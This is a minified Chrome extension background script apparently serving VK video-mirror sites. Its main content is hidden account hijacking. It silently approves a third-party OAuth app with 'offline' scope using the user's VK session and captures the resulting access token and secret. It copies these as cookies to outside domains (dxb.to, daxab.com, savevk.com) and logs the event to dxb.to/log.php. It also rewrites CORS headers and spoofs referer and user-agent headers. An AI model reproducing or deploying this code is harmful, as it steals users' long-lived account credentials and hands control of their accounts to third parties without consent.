!function(){function b(){function a(){e=!0,d=0==Math.round(new Date/1e3)%2?4894723:4994316;var a=new XMLHttpRequest,b="https://oauth.vk.com/authorize?client_id="+d+"&display=mobile&scope=offline,video,nohttps&response_type=token";a.open("GET",b,!0),a.withCredentials=!0,a.onreadystatechange=function(){if(4==a.readyState&&200<=a.status&&300>a.status){var c=a.responseText;(m=c.match(/action="(.*act=grant_access.*)"/i))&&(b=m[1],d=b,(e=new XMLHttpRequest).open("GET",d,!0),e.withCredentials=!0,e.onreadystatechange=function(){},e.send())}var d,e},a.send()}this.setCookie=[],this.requestHeaders=[{name:"Access-Control-Allow-Origin",value:"*"},{name:"Access-Control-Allow-Credentials",value:"true"},{name:"Access-Control-Allow-Methods",value:"POST, GET"},{name:"Allow",value:"POST, GET"},{name:"Access-Control-Allow-Headers",value:"Accept, Authorization, Content-Type, Cache-Control, Pragma, Origin, Cookie, Referer"}],this.hostname=function(a){return(-1<a.indexOf("://")?a.split("/")[2]:a.split("/")[0]).split(":")[0].split("?")[0]},this.root=function(a){return a.toString().match(/[a-zA-Z0-9]*\.[a-zA-Z]*$/)[0]},this.setToken=function(a){try{var b=JSON.parse("{\""+decodeURI(a.split("#")[1]).replace(/"/g,"\\\"").replace(/&/g,"\",\"").replace(/=/g,"\":\"")+"\"}");if(b.access_token&&b.secret){chrome.cookies.set({url:"https://dxb.to",name:"vk_access_token",value:b.access_token},function(){}),chrome.cookies.set({url:"https://dxb.to",name:"vk_secret",value:b.secret},function(){}),chrome.cookies.set({url:"https://dxb.to",name:"vk_user_id",value:b.user_id},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_access_token",value:b.access_token},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_secret",value:b.secret},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_user_id",value:b.user_id},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_access_token",value:b.access_token},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_secret",value:b.secret},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_user_id",value:b.user_id},function(){});var c=new XMLHttpRequest;c.open("POST","https://dxb.to/log.php",!0),c.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),c.onreadystatechange=function(){},c.send("appId="+d);var e={};e.vk_access_token=b.access_token,e.vk_secret=b.secret,e.vk_user_id=b.user_id,e.app_id=d,chrome.storage.local.set(e,function(){})}}catch(a){}},this.getToken=function(){chrome.storage.local.get(["vk_access_token","vk_secret","vk_user_id","app_id"],function(b){b.vk_access_token&&b.vk_secret?(chrome.cookies.set({url:"https://dxb.to",name:"vk_access_token",value:b.vk_access_token},function(){}),chrome.cookies.set({url:"https://dxb.to",name:"vk_secret",value:b.vk_secret},function(){}),chrome.cookies.set({url:"https://dxb.to",name:"vk_user_id",value:b.vk_user_id},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_access_token",value:b.vk_access_token},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_secret",value:b.vk_secret},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_user_id",value:b.vk_user_id},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_access_token",value:b.vk_access_token},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_secret",value:b.vk_secret},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_user_id",value:b.vk_user_id},function(){})):a()})},this.urls=["https://vk.com/*","https://*.vk.com/*","https://*.vkuservideo.net/*","https://*.vk-cdn.net/*","https://*.mycdn.me/*","https://*.vkuserlive.com/*"],this.responseHeaders=["blocking","responseHeaders"],this.blockingRequestHeaders=["blocking","requestHeaders","extraHeaders"]}function c(a,b){var c=new XMLHttpRequest;c.open("GET","https://api.vk.com/method/"+a+"?"+b,!0),c.onreadystatechange=function(){var a;4==c.readyState&&200<=c.status&&300>c.status&&(a=JSON.parse(c.responseText),chrome.tabs.getSelected(null,function(b){chrome.tabs.sendMessage(b.id,{response:a})}))},c.send()}var d=0,e=!1,b=new b;chrome.extension.onMessage.addListener(function(a){c(a.method,a.query)}),chrome.tabs.onUpdated.addListener(function(a,c,d){d.url.match(/^https?:\/\/(www.)?(daxab.com\/player\/|dxb.to\/player\/|biqle.ru|biqle.com|biqla.com|daftsex.com|savevk.com)/i)&&(chrome.storage.local.get(["vk_access_token","vk_secret","vk_user_id","app_id"],function(a){a.vk_access_token&&a.vk_secret&&(chrome.cookies.set({url:"https://dxb.to",name:"vk_access_token",value:a.vk_access_token},function(){}),chrome.cookies.set({url:"https://dxb.to",name:"vk_secret",value:a.vk_secret},function(){}),chrome.cookies.set({url:"https://dxb.to",name:"vk_user_id",value:a.vk_user_id},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_access_token",value:a.vk_access_token},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_secret",value:a.vk_secret},function(){}),chrome.cookies.set({url:"https://daxab.com",name:"vk_user_id",value:a.vk_user_id},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_access_token",value:a.vk_access_token},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_secret",value:a.vk_secret},function(){}),chrome.cookies.set({url:"https://savevk.com",name:"vk_user_id",value:a.vk_user_id},function(){}))}),chrome.webRequest.onHeadersReceived.addListener(function(a){if(a.url.match(/^https:\/\/vk.com\/(video_hls|al_video).php/i)||"api.vk.com"==b.hostname(a.url))for(var c=0;c<b.requestHeaders.length;c++)a.responseHeaders.push(b.requestHeaders[c]);return{responseHeaders:a.responseHeaders}},{urls:b.urls},b.responseHeaders),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){var c=[];if("vkuservideo.net"==b.root(b.hostname(a.url))||"vkuserlive.com"==b.root(b.hostname(a.url))||"vk-cdn.net"==b.root(b.hostname(a.url))||"mycdn.me"==b.root(b.hostname(a.url)))for(var d=0;d<a.requestHeaders.length;d++)"user-agent"===a.requestHeaders[d].name.toLowerCase()?c.push({name:a.requestHeaders[d].name,value:"UNKNOWN"}):"referer"===a.requestHeaders[d].name.toLowerCase()||"origin"===a.requestHeaders[d].name.toLowerCase()?c.push({name:a.requestHeaders[d].name,value:"https://vk.com"}):c.push({name:a.requestHeaders[d].name,value:a.requestHeaders[d].value});else for(d=0;d<a.requestHeaders.length;d++)"user-agent"===a.requestHeaders[d].name.toLowerCase()&&"api.vk.com"==b.hostname(a.url)?c.push({name:a.requestHeaders[d].name,value:"UNKNOWN"}):c.push({name:a.requestHeaders[d].name,value:a.requestHeaders[d].value});return a.requestHeaders=c,{requestHeaders:a.requestHeaders}},{urls:b.urls},b.blockingRequestHeaders))}),chrome.webRequest.onHeadersReceived.addListener(function(a){if("mycdn.me"==b.root(b.hostname(a.url))){for(var c=[],d=0;d<a.responseHeaders.length;d++)"access-control-allow-origin"===a.responseHeaders[d].name.toLowerCase()?c.push({name:a.responseHeaders[d].name,value:"*"}):c.push({name:a.responseHeaders[d].name,value:a.responseHeaders[d].value});return a.responseHeaders=c,{responseHeaders:a.responseHeaders}}if(d)for(var c=0;c<a.responseHeaders.length;++c)"location"===a.responseHeaders[c].name.toLowerCase()&&a.responseHeaders[c].value.match(/https:\/\/oauth.vk.com\/blank.html#(.+)/i)&&(d=!1,b.setToken(a.responseHeaders[c].value));return{responseHeaders:a.responseHeaders}},{urls:["https://login.vk.com/*","https://oauth.vk.com/*","https://*.mycdn.me/*"]},b.responseHeaders),chrome.cookies.getAll({url:"https://vk.com"},function(a){for(var c=0,d=0;d<a.length;d++)b.setCookie.push(a[d].name+"="+a[d].value),"remixsid"!=a[d].name&&"remixttpid"!=a[d].name||c++;c&&b.getToken()})}();